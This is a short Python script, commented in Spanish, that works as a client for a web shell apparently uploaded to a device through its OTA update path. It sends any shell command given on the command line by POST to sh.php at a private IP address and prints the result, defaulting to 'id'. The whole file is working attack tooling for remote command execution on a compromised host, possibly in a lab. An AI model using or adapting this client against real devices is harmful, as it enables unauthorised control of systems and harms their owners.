#!/usr/bin/env python3
"""Cliente mínimo para la webshell subida via OTA.
Uso: python webcmd.py "comando shell"
"""
import sys
import urllib.parse
import urllib.request

BASE = "http://192.168.159.128/ota/sh.php"
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
data = urllib.parse.urlencode({"cmd": cmd}).encode()
req = urllib.request.Request(BASE, data=data, method="POST")
with urllib.request.urlopen(req, timeout=60) as r:
    sys.stdout.buffer.write(r.read())
